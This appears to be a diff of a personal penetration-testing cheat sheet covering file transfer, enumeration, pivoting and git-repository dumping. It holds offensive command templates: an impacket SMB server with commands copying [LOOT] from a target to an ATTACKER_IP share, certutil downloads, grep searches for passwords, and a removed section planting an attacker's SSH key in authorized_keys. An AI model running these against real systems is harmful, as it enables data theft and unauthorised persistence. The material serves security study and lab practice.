@@ -50,10 +50,12 @@ certutil -urlcache -f [path_to_file] [file_name]
 #copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
 #net use \\ATTACKER_IP\share /del
 
-sudo python3 /opt/impacket/examples/smbserver.py [share_name] pwd -smb2support 
-#Target
-net view \10.10.14.3\
-[CMD] copy [LOOT] \[IP]\[share_name] 
+sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support 
+#Target 
+net use \\[ip]\share
+
+##net view \10.10.14.3\
+[CMD] copy [LOOT] "\\[IP]\share" 
 [PS] Copy-Item [LOOT] \[share]\[LOOT]
 ```
 
@@ -97,19 +99,18 @@ find / -type d -maxdepth 5 -writable 2>/dev/null
 
 Find passwords in files
 grep -Ri 'password' [directory_to_search] 2>/dev/null
+
+Find writable directories
+find / -type d -maxdepth 5 -writable 2>/dev/null
 ```
 
 ## Pivoting & Port Forwarding
 
 {% embed url="https://github.com/twelvesec/port-forwarding" %}
 
-{% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/" %}
-
 {% embed url="https://theyhack.me/Proxychains-Double-Pivoting/" %}
 
-{% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}
-
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
 
 ## Git
 
@@ -117,24 +118,11 @@ grep -Ri 'password' [directory_to_search] 2>/dev/null
 
 ```
 https://github.com/arthaud/git-dumper
+[GO IN ORDER]
 git status
-git diff --cached [file]
-git show <hash> [in logs]
-git restore [file]
 git log
-git checkout [hash]
-```
-
-## SSH Keys
-
-Every revshell as an actual user -> this is the play
-
-```
-KALI
-ssh-keygen -t rsa
-chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]
-
-REMOTE
-/home/user/.ssh$ echo "[id_rsa.pub value]" > authorized_keys
-chmod 700 .ssh; chmod 700 .ssh/authorized_keys
+git diff --cached $file
+git show <hash> [in logs]
+git restore $file
+git checkout $hash
 ```
